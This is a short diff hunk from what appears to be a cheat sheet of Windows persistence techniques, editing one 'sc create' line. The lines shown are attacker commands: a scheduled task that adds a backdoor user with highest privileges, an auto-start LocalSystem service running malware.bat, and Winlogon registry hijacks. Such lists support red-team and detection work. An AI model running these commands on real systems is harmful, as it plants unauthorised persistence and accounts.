@@ -14,7 +14,7 @@
     - SCHTASKS /CREATE /SC HOURLY /TN "System\Setup" /TR "C:\Windows\Temp\setup.bat" /F
     - SCHTASKS /CREATE /SC DAILY /TN "System\Nothing" /TR "cmd /C 'net user sus sus /add'" /RL HIGHEST /F
 - Service
-    - sc create persistence binpath="cmd.exe /k C:\Windows\Temp\malware.bat" start="auto" obj="LocalSystem" /f
+    - sc create persistence binpath="cmd.exe /k C:\Windows\Temp\malware.bat" start="auto" obj="LocalSystem"
 - WinLogon
     - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v Userinit /t REG_SZ /d C:\Windows\Temp\malware.bat /f
     - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell /t REG_SZ /d "explorer.exe, C:\Windows\Temp\malware.bat" /f
